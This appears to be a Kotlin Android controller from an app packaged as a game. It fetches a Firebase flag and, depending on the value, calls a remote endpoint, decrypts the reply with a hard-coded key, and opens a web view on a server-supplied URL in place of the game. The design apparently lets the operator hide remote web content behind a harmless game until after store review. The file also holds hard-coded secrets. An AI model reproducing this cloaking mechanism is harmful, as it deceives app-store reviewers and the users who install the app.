package dev.fs.mad.game11.controller

import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.util.Log
import com.android.volley.Request
import com.android.volley.RequestQueue
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import dev.fs.mad.game11.R
import dev.fs.mad.game11.ui.ConsentActivity
import dev.fs.mad.game11.ui.MainActivity
import dev.fs.mad.game11.ui.WebActivity
import org.json.JSONException
import org.json.JSONObject



class VolleyController(private val context: Context) {

    private val databaseUrl = "https://madproject-374e2-default-rtdb.firebaseio.com/"

    companion object {
        private const val SPLASH_TIME_OUT = 2000
        var policyURL = ""
        var appStatus = ""
        var apiResponse = ""
        var endpoint = ""
        var policyMain = "file:///android_asset/index.html"
        var gameStatus = 1
    }

    fun getPolicy(){
        val queue = Volley.newRequestQueue(context)
        val appName = context.getString(R.string.app_name)

        val jsonObjectRequest = JsonObjectRequest(
            Request.Method.GET, "$databaseUrl/MADDB/$appName.json", null,
            { response ->
                try {
                    if (response != null) {
                        Log.d("firebase response", response.toString())
                        gameStatus = response.getInt("gameStatus")
                        val url = response.getString("link")

                        Log.d("TAG 1", "$gameStatus / $url")


                        if (gameStatus == 1) {
                            policyMain = url
                        } else {
                            endpoint = url
                            Log.d("FB ENDPOINT",endpoint)
                        }

                        Handler().postDelayed({
                            val intent = Intent(context, ConsentActivity::class.java)
                            intent.putExtra("url", if (gameStatus == 1) policyMain else endpoint)
                            context.startActivity(intent)
                        }, SPLASH_TIME_OUT.toLong())
                    } else {
                        // Handle the case where the response is null
                        Log.e("TAG", "Response is null")
                    }
                } catch (e: JSONException) {
                    Log.d(ContentValues.TAG, e.toString())
                }
            }
        ) { error ->
            Log.w(ContentValues.TAG, "Failed to read value.", error)
            if (error.networkResponse != null) {
                Log.e("TAG", "Error Response Code: ${error.networkResponse.statusCode}")
            }
            if (error.message != null) {
                Log.e("TAG", "Error Message: ${error.message}")
            }
        }

        queue.add(jsonObjectRequest)
    }

    fun gameMaintenance(packageName: String) {
        val connectAPI: RequestQueue = Volley.newRequestQueue(context)
        val requestBody = JSONObject()
        Log.d("packageName", packageName)

        try {
            requestBody.put("appid", "5G")
            requestBody.put("package", packageName)
        } catch (e: JSONException) {
            e.printStackTrace()
        }

        val jsonRequest = JsonObjectRequest(
            Request.Method.GET, endpoint, requestBody,
            { response ->
                apiResponse = response.toString()
                handleApiResponse()
            },
            { error ->
                Log.d("API:RESPONSE", error.toString())
            })

        connectAPI.add(jsonRequest)
    }

    private fun handleApiResponse() {
        try {
            val jsonData = JSONObject(apiResponse)
            val decryptedData = Crypt.decrypt(
                jsonData.getString("data"),
                "21913618CE86B5D53C7B84A75B3774CD"
            )
            val gameData = JSONObject(decryptedData)

            appStatus = jsonData.getString("gameKey")
            policyURL = gameData.getString("gameURL")



            Log.d("Decrypted Data", gameData.toString())
            Log.d("GAME URL", policyURL)
            Log.d("App Status", appStatus)

                if(appStatus.toBoolean()){
                    val intent = Intent(context, WebActivity::class.java)
                    intent.putExtra("url", policyURL)
                    context.startActivity(intent)

                }else{
                    val intent = Intent(context, MainActivity::class.java)
                    context.startActivity(intent)
                }

                /*if (appStatus.toBoolean()) {
                    val intent = Intent(context, WVActivity::class.java)
                    intent.putExtra("url", policyURL)
                    context.startActivity(intent)

                } else {
                    Handler().postDelayed({
                        val intent = Intent(context, WVActivity::class.java)
                        intent.putExtra("url", policyURL)
                        context.startActivity(intent)
                    }, SPLASH_TIME_OUT.toLong())
                }*/

        } catch (e: Exception) {
            throw RuntimeException(e)
        }
    }

}
